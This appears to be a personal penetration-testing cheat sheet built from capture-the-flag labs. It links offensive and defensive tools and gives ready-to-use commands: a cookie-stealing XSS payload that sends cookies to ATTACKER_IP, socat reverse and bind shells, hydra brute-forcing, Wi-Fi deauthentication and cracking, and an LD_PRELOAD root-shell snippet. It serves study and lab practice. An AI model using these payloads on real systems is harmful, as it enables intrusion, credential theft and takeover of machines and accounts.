# cybersecurity

#### CLI Tools

- Bruteforce
  - [hashcat](https://hashcat.net/hashcat/)
  - [john](https://github.com/openwall/john)
    - ```bash
      cd ~
      git clone https://github.com/openwall/john
      sudo apt install libssl-dev
      cd john/src
      ./configure && make
      echo 'export PATH="PATH:PATH:HOME/john/run"' >> ~/.bashrc
      echo "alias john='~/john/run/john'" >> ~/.bashrc
      source ~/.bashrc
      ```
    - [ssh2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py)
  - [hydra](https://github.com/vanhauser-thc/thc-hydra)
    - ``hydra -l username -P wordlist.txt server service``
    - ``hydra -l username -P wordlist.txt service://[MACHINE_IP]:service_port``
    - POST Web Form
      ``sudo hydra `<username>` `<wordlist>` MACHINE_IP http-post-form "`<path>`:<login_credentials>:<invalid_response>"``
    - SSH
      ``hydra -l `<username>` -P `<full path to pass>` MACHINE_IP -t 4 ssh``
- Encryption/Decryption
  - [gpg](https://gnupg.org/) (GNU Privacy Guard)
    - Encrypt: ``gpg --symmetric --cipher-algo CIPHER message.txt``
    - Decrypt: ``gpg --output original_message.txt --decrypt message.gpg``
    - ASCII Armoured Output: ``gpg --armor --symmetric --cipher-algo CIPHER message.txt``
  - [openssl](https://www.openssl.org/)
    - CSR
      ``openssl req -new -nodes -newkey rsa:4096 -keyout key.pem -out cert.csr``
- Python Tools
  * python to exe
    * [PyInstaller](http://www.pyinstaller.org/)
    * [py2exe](https://pypi.python.org/pypi/py2exe/0.9.2.0)
  * [Scapy](https://scapy.net/)
    ``sudo apt install python3-scapy``
  * [keyboard](https://pypi.org/project/keyboard/)
    ``pip3 install keyboard``
  * [hashlib](https://docs.python.org/3/library/hashlib.html)
  * [Paramiko](https://www.paramiko.org/index.html)
    ``pip install paramiko``
- 

#### Online Tools

- [hashes.com](https://hashes.com/en/decrypt/hash)
- [crackstation.net](https://crackstation.net/)
- [cyberchef](https://gchq.github.io/CyberChef/)

#### Defensive Security

* [https://www.abuseipdb.com/](https://www.abuseipdb.com/)
* Network
  * [tcpdump](https://www.tcpdump.org/)
  * [wireshark](https://www.wireshark.org/)
  * [snort](https://www.snort.org/)
    * [snorpy](http://snorpy.cyb3rs3c.net/)
  * [zeek](https://zeek.org/)
  * [network-miner](https://www.netresec.com/?page=NetworkMiner)
  * [brim](https://www.brimdata.io/)
* 

#### Web Hacking

- [OWASP](https://owasp.org/)
  - [OWASP Top 10](https://owasp.org/www-project-top-ten/)
  - [OWASP Favicon Databse](https://wiki.owasp.org/index.php/OWASP_favicon_database)
- [Postman](https://www.postman.com/)
- [Burp Suite](https://portswigger.net/burp)
  - [FoxyProxy Standard](https://chrome.google.com/webstore/detail/foxyproxy-standard/gcknhkkoolaabfmlnjonogaaifnjlfnp)
- [https://github.com/assetnote/kiterunner](https://github.com/assetnote/kiterunner)
- [https://github.com/xmendez/wfuzz](https://github.com/xmendez/wfuzz)
- [https://github.com/owasp-amass/amass](https://github.com/owasp-amass/amass)
- [ffuf](https://github.com/ffuf/ffuf)
- [dirb](https://www.kali.org/tools/dirb/)
- [gobuster](https://www.kali.org/tools/gobuster/)
  - Directory Enumeration
    ``gobuster -u MACHINE_IP -w /snap/seclists/current/Discovery/Web-Content/directory-list-1.0.txt``
- [nikto](https://www.kali.org/tools/nikto/)
- [nessus](https://www.tenable.com/products/nessus?utm_campaign=gs-{11596512479}-{110256808302}-{537515898656}_00026644_fy23&utm_promoter=tenable-hv-brand-00026644&utm_source=google&utm_term=nessus&utm_medium=cpc&utm_geo=apac&gclid=CjwKCAjw5remBhBiEiwAxL2M94jwwfvyR4FWvmcRZhAz1xxjoaZSZlPskF3mbHCn9c7zI-DdcrOLbBoCn0IQAvD_BwE)
- Inspect Webhook and HTTP Requests
  - [requestbin.com](requestbin.com)
- [Beef](https://beefproject.com/)
- XSS
  - Blind XSS
    - [XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express)
  - XSS Polyglot
    ``jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e``
  - Cookie Stealing XSS
    ```
    </textarea><script>fetch('http://ATTACKER_IP:PORT?cookie=' + btoa(document.cookie) );</script>
    ```
- Command Injection
  - [Payload List](https://github.com/payloadbox/command-injection-payload-list)
- SQLi
  - In-Band
  - Blind
    - Authentication Bypass
    - Boolean-based
    - Time-based
  - Out-of-Band
- Subresource Integrity (SRI)
  - Generate Hash: [https://www.srihash.org/](https://www.srihash.org/)
  - ``<script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>``
- 

#### Network Services

* [netcat](https://en.wikipedia.org/wiki/Netcat)

  * ``nc -lvnp port``
* [rlwrap](https://github.com/hanslub42/rlwrap)

  * ``rlwrap nc -lvnp port``
  * ``CTRL + Z``
  * ``stty raw -echo; fg``
* [socat](https://www.kali.org/tools/socat/)

  * [socat static compiled binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true)
  * Change Terminal Size
    * ``stty -a``
    * ``stty rows number``
    * ``stty cols number``
  * ``socat TCP-L:PORT -``
  * ``socat TCP:TARGET_IP:TARGET_PORT -``
  * Fully Stable Linux TTY Reverse Shell
    * Listener
      ``socat TCP-L:PORT FILE:TTY,raw,echo=0``
    * Activation Command
      ``socat TCP:ATTACKER_IP:ATTACKER_PORT EXEC:"bash -li",pty,stderr,sigint,setsid,sane``
  * Reverse Shells
    * Windows
      ``socat TCP:LOCAL_IP:LOCAL_PORT EXEC:powershell.exe,pipes``
    * Linux
      ``socat TCP:LOCAL_IP:LOCAL_PORT EXEC:"bash -li"``
  * Blind Shells
    * Windows
      ``socat TCP-L:PORT EXEC:powershell.exe,pipes``
    * Linux
      ``socat TCP-L:PORT EXEC:"bash -li"``
  * Encrypted Shells
    Replace `TCP` with `OPENSSL`
    * Generate Certificate
      ``openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt``
      ``cat shell.key shell.crt > shell.pem``
    * Listener
      ``socat OPENSSL-LISTEN:PORT,cert=shell.pem,verify=0 -``
    * Activation Command
      ``socat OPENSSL:LOCAL_IP:LOCAL_PORT,verify=0 EXEC:/bin/bash``
  * 
* [nmap](https://nmap.org/)

  * Common
    * ``nmap -A -sC -sV -p- -T4 --min-rate=9326 -vv MACHINE_IP``
    * ``nmap -Pn -sV MACHINE_IP``
    * ``nmap MACHINE_IP -p port1,port2,port3 -script vuln``
  * Options
    * no DNS lookup ``-n``
    * reverse-DNS lookup ``-R``
    * host discovery only (without port-scanning) ``-sn``
    * all ports ``-p-``
    * scan ports 1 to 1023 ``-p1-1023``
    * 100 most common ports ``-F``
    * scan ports in consecutive order ``-r``
    * T0 being the slowest and T5 the fastest ``-T<0-5>``
    * rate <= 50 packets/sec ``--max-rate 50``
    * rate >= 15 packets/sec ``--min-rate 15``
    * at least 100 probes in parallel ``--min-parallelism 100``
    * debugging ``-d``
    * verbose ``-v``
    * explains reasoning ``--reason``
    * fragment IP data ``-f``
    * specify source port ``--source-port PORT_NUM``
    * append random data to reach given length ``--data-length NUM``
    * service/version info ``-sV``
    * os detection ``-O``
    * tracerpite ``--traceroute``
  * ARP Scan ``sudo nmap -PR -sn MACHINE_IP/24``
  * ICMP
    * ICMP Echo Scan ``sudo nmap -PE -sn MACHINE_IP/24``
    * ICMP Timestamp Scan ``sudo nmap -PP -sn MACHINE_IP/24``
    * ICMP Address Mask Scan ``sudo nmap -PM -sn MACHINE_IP/24``
  * TCP
    * TCP SYN Ping Scan ``sudo nmap -PS22,80,443 -sn MACHINE_IP/30``
    * TCP ACK Ping Scan `sudo nmap -PA22,80,443 -sn MACHINE_IP/30`
    * TCP Connect Scan ``nmap -sT 10.10.117.61``
    * TCP Null Scan ``sudo nmap -sN MACHINE_IP``
    * TCP FIN Scan ``sudo nmap -sF MACHINE_IP``
    * TCP Xmas Scan ``sudo nmap -sX MACHINE_IP``
    * TCP Maimon Scan ``sudo nmap -sM MACHINE_IP``
    * Custom TCP Scan ``sudo nmap --scanflags URGACKPSHRSTSYNFIN MACHINE_IP``
  * UDP
    * UDP Ping Scan `sudo nmap -PU53,161,162 -sn MACHINE_IP/30`
  * Spoofed Source IP ``sudo nmap -S SPOOFED_IP MACHINE_IP``
  * Spoofed MAC Address ``--spoof-mac SPOOFED_MAC``
  * Decoy Scan ``nmap -D DECOY_IP,ME MACHINE_IP``
  * Idle (Zombie) Scan ``sudo nmap -sI ZOMBIE_IP MACHINE_IP``
* [enum4linux](https://www.kali.org/tools/enum4linux/)

  * ``enum4linux -a MACHINE_IP``
* [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)
* [dsniff](https://www.kali.org/tools/dsniff/)
* Logging

  * [rsyslog](https://www.rsyslog.com/)
  * [logrotate](https://linux.die.net/man/8/logrotate)
  * [splunk](https://www.splunk.com/)
  * [elastic-search](https://www.elastic.co/elastic-stack)
* Traffic Analysis

  * [wireshark](https://www.wireshark.org/)
  * [tshark](https://www.wireshark.org/docs/man-pages/tshark.html)
  * [NetworkMiner](https://www.netresec.com/?page=NetworkMiner)
  * RSA Netwitness
* MITM

  * [Ettercap](https://www.ettercap-project.org/)
  * [Bettercap](https://www.bettercap.org/)
* Wifi

  * [aircrack-ng](https://www.aircrack-ng.org/)
    * Check for Wifi adapter interface
      ``iwconfig``
    * Run Wifi adapter on `Monitor` mode
      ``sudo airmon-ng start interface_name``
    * Check and kill any interfering process
      ``sudo airmon-ng check kill``
    * Capture traffic from nearby Wifi
      ``sudo airodump-ng interface_name``
    * Capture traffic from target Wifi
      ``sudo airodump-ng --bssid target_bssid -c target_channel --write target_traffic interface_name``
    * Deauthentication attack
      ``sudo aireplay-ng --deauth packet_count -a target_bssid interface_name``
      * In case of similar issue (``wlan0mon is on channel 2, but the AP uses channel 5 ``)
        ``sudo airmon-ng start interface_name target_channel``
    * Cracking the password
      ``sudo aircrack-ng -b target_bssid captured_traffic.cap -w wordlist``
    * Convert to hashcat file (`-j` or `-J`)
      ``sudo aircrack-ng -j output.hccapx -b target_bssid file.cap``
  * [wifite](https://www.kali.org/tools/wifite/)
* [smtp-user-enum](https://www.kali.org/tools/smtp-user-enum/#smtp-user-enum)
* [metasploit](https://www.metasploit.com/)

  * Database
    * ``systemctl start postgresql``
    * ``msfdb init``
    * db_status
    * workspace
    * help
    * db_nmap
    * hosts
    * services
  * SMTP
    * smtp_enum
    * smtp_version
  * MySQL
    * mysql_sql
    * mysql_schemadump
    * mysql_hashdump
  * multi/handler
  * msfvenom
  * portscan
  * SMB
    * smb_enumshares
    * smb_version
    * smb_login
  * enum_shares
  * meterpreter
  * hashdump
  * kiwi
* [searchsploit](https://www.exploit-db.com/searchsploit)
* [Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
* 

#### Priviledge Escalation

* [PEASS-ng](https://github.com/carlospolop/PEASS-ng)
* [GTFOBins](https://gtfobins.github.io/)
* Linux
  * Commands
    * ``hostname``
    * ``uname -a``
    * ``/proc/version``
    * ``/etc/issue``
    * ps
      * ``ps``
      * ``ps -A``
      * ``ps axjf``
      * ``ps aux``
    * ``env``
    * ``sudo -l``
    * ``id``
    * ``/etc/passwd``
      * ``cat /etc/passwd | cut -d ":" -f 1``
      * ``cat /etc/passwd | grep home``
    * ``history``
    * ``ifconfig``
    * ``ip route``
    * ``netstat``
      * ``netstat -a``
    * ``find``
      * ``find /home -name flag1.txt``
  * [LinPeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
  * [LinEnum](https://github.com/rebootuser/LinEnum)
  * Kernel Exploit
    * [https://www.linuxkernelcves.com/cves](https://www.linuxkernelcves.com/cves)
  * Sudo
    * ``sudo -l``
    * [https://gtfobins.github.io/](https://gtfobins.github.io/)
    * [LD_PRELOAD](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/)
      Generate a shared library which will be loaded and executed before the program is run.
      1. Check for LD_PRELOAD (with the env_keep option)
      2. Write a simple C code compiled as a share object (.so extension) file
         * ``#include <stdio.h> #include <sys/types.h> #include <stdlib.h> void _init() { unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/bash"); }``
         * ``gcc -fPIC -shared -o shell.so shell.c -nostartfiles``
      3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file
         * ``sudo LD_PRELOAD=/home/user/ldpreload/shell.so find``
  * SUID
  * 
* Windows

#### OSINT

- Social
  - [sherlock](https://github.com/sherlock-project/sherlock)
  - [LinkedInt](- https://github.com/vysecurity/LinkedInt -)
  - [gophish](- - https://github.com/gophish/gophish -)
- [Google Dorking](https://gist.github.com/sundowndev/283efaddbcf896ab405488330d1bbc06)
  - [Google Advanced Search](https://www.google.com/advanced_search)
  - [Google Hacking Database](https://www.exploit-db.com/google-hacking-database) (GHDB)
- [Wayback Machine](https://archive.org/web/)
- Subdomain Enumeration
  - Certificate Search
    - [https://crt.sh/](https://crt.sh/)
    - [https://ui.ctsearch.entrust.com/ui/ctsearchui](https://ui.ctsearch.entrust.com/ui/ctsearchui)
  - [Sublist3r](https://github.com/aboul3la/Sublist3r)
- Domain Name or IP Related
  - [whois](https://lookup.icann.org/en/lookup)
    - [whois-history](https://research.domaintools.com/research/whois-history/)
  - [dnsrecon](https://www.kali.org/tools/dnsrecon/)
  - [viewdns.info](https://viewdns.info/)
  - [threat-intelligence-platform](https://threatintelligenceplatform.com/)
  - [censys](https://search.censys.io/)
  - [shodan](https://www.shodan.io/)
  - [https://wigle.net/](https://wigle.net/)
- File Related
  - [pdfinfo](https://linux.die.net/man/1/pdfinfo)
  - [exiftool](https://exiftool.org/)
- [recon-ng](https://www.kali.org/tools/recon-ng/)
- [maltego](https://www.kali.org/tools/maltego/)

#### Vulnerability Research

- [https://www.exploit-db.com/](https://www.exploit-db.com/)
- [https://www.exploit-db.com/searchsploit](https://www.exploit-db.com/searchsploit)
- [https://nvd.nist.gov/vuln/search](https://nvd.nist.gov/vuln/search)
- [https://www.rapid7.com/db/](https://www.rapid7.com/db/)
- [https://cve.mitre.org/](https://cve.mitre.org/)
- [https://www.cvedetails.com/](https://www.cvedetails.com/)

#### Malware Research

- [malapi.io](https://malapi.io/)
- [Windows API](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)
- [Process Hollowing](https://attack.mitre.org/techniques/T1055/012/)
- [https://github.com/PatrikH0lop/malware_showcase](https://github.com/PatrikH0lop/malware_showcase)
- [Yara Rules](https://yara.readthedocs.io/en/stable/writingrules.html)
- Static Malware Analysis

  - [PEStudio](https://www.winitor.com/download)
  - [radare2](https://rada.re/n/)
  - [Binary Ninja](https://binary.ninja/)
  - [IDA Pro](https://hex-rays.com/ida-pro/)
  - [ghidra](https://ghidra-sre.org/)
  - [Cutter](https://cutter.re/)
- Antivirus (AV)

  - [SharpEDRChecker](https://github.com/PwnDexter/SharpEDRChecker)
  - Open Source
    - [ClamAV](https://www.clamav.net/)
  - [AntiscanMe](https://antiscan.me/)
  - [Jotti](https://virusscan.jotti.org/)
- 

#### Hardware Tools

- USB Rubber Ducky Using Rasberry Pi Pico
  https://github.com/dbisu/pico-ducky
- FemtoCell
- Stingray

#### Word Lists

- [RockYou](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)
- [SecLists](https://github.com/danielmiessler/SecLists)
  - [directory-list-1.0.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/directory-list-1.0.txt)
- [jwt-secrets](https://github.com/wallarm/jwt-secrets)
